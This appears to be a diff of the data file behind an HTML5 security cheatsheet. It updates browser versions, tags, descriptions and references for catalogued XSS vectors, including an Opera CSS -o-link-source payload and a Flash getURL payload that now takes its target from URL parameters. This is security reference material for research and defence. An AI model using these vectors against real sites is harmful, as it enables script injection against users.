@@ -35,10 +35,10 @@ var items =
         },
         'browsers'   : {
 		    'firefox' : ['4.0'],
-            'opera': ['10.5', '10.6', '11.0', 'mobile'], 
+            'opera': ['10.5', '10.6', '11.0', '12.0', 'mobile'], 
 			'chrome': ['10.0']
         },
-        'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
+        'tags'       : ['xss', 'html5', 'opera', 'chrome', 'firefox', 'formaction', 'javascript', 'button'],
         'reporter'   : '.mario'
     },
     { /* ID 2 - XSS via x-imap4-modified-utf7 (1) */
@@ -271,7 +271,7 @@ var items =
         },          
         'browsers'   : {
 		    'firefox' : ['4.0'],
-            'opera': ['10.5', '10.6'],
+            'opera': ['10.5', '10.6', '11.0', '12.0'],
             'safari' : ['4.0', '5.0'],
             'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
         },
@@ -315,7 +315,7 @@ var items =
             'safari' : ['4.0', '5.0'],
             'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
         },
-        'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
+        'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'safari', 'firefox'],
         'reporter'   : '.mario'
     },
     { /* ID 9 - Opera link-source JavaScript execution via CSS */
@@ -332,15 +332,15 @@ var items =
         },
         'data'       : '<a style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X</a>',
         'description': {
-            'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript. Note that Opera 11 requires an actual <a> tag to have this work - while earlier versions work with other tags too.',
+            'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript. Note that Opera 11.0-11.01 requires an actual <a> tag to have this work - while earlier versions work with other tags too. For later versions still available a data URI.',
             'ja' : 'Opera\u306f\u4efb\u610f\u306eHTML\u8981\u7d20\u306b\u3001\u30af\u30ea\u30c3\u30af\u3057\u3066\u5b9f\u884c\u3067\u304d\u308bJavaScript\u3092\u542b\u3081\u308b\u3053\u3068\u306e\u3067\u304d\u308blink\u30bd\u30fc\u30b9\u306e\u8a2d\u5b9a\u3092\u8a31\u3057\u3066\u3044\u308b\u3002',
-            'ru' : 'Opera позволяет устанавливать ссылки для любых HTML-тегов, делать их интерактивными и пригодными для внедрения JavaScript.',
+            'ru' : 'Opera позволяет устанавливать ссылки для любых HTML-тегов, делать их интерактивными и пригодными для внедрения JavaScript. Обратите внимание, что в Opera 11.0-11.01 необходимо, чтобы такая ссылка устанавливаливалась для тега <a>, но не для остальных тегов. Для более старших версий остается доступным протокол data, с помощью которого можно достичь аналогичного эффекта.',
             'cs' : 'Opera umožňuje nastavit link source pro některé HTML elementy. Můžou tak vyvpolat potřebnou akci po kliknutí',
             'de' : '',
             'tr' : 'Opera keyfi olarak eklenen HTML öğeleri için "link sources" atanmasına izin vermektedir - tıklanabilir yapılarak JavaScript çalıştırılabilir',
             'zh' : 'Opera允许给任何HTML元素设置link sources,它们将可以点击和执行javascript.注意:opera 11要求是<a>标签,早期版本任意'
 		},
-        'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html'],
+        'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html', 'https://hackvertor.co.uk/hvurl/3c'],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
@@ -351,7 +351,7 @@ var items =
         },          
         'browsers'   : {
             'opera': [
-                '8.0', '9.0', '10.x', '11.0', 'mobile'
+                '8.0', '9.0', '10.x', '11.0', '12.0', 'mobile'
             ]
         },
         'tags'       : ['xss', 'css', 'link-source', 'opera', 'proprietary'],
@@ -390,7 +390,7 @@ var items =
             'zh' : '确保VIDEO的poster属性是相对URI、http URI和MIME-typed正确的data URI'
         },            
         'browsers'   : {
-            'opera': ['10.5', '10.6']
+            'opera': ['10.5', '10.6', '11.01']
         },
         'tags'       : ['xss', 'poster', 'video', 'opera', 'html5'],
         'reporter'   : '.mario'
@@ -2816,7 +2816,7 @@ var items =
             'crossdomain'    : '1',            
             'path'          : 'http://html5sec.org/test.swf',
             'name'          : 'test.swf',
-            'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest("javascript:alert(1);"),"_top");\r\n}}'
+            'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest(flash.Lib._root.url||"javascript:alert(1);"),flash.Lib._root.name||"_top");\r\n}}'
         },        
         'urls'    : ['http://www.w3.org/TR/REC-html40/struct/objects.html'],
         'howtofix'   : {
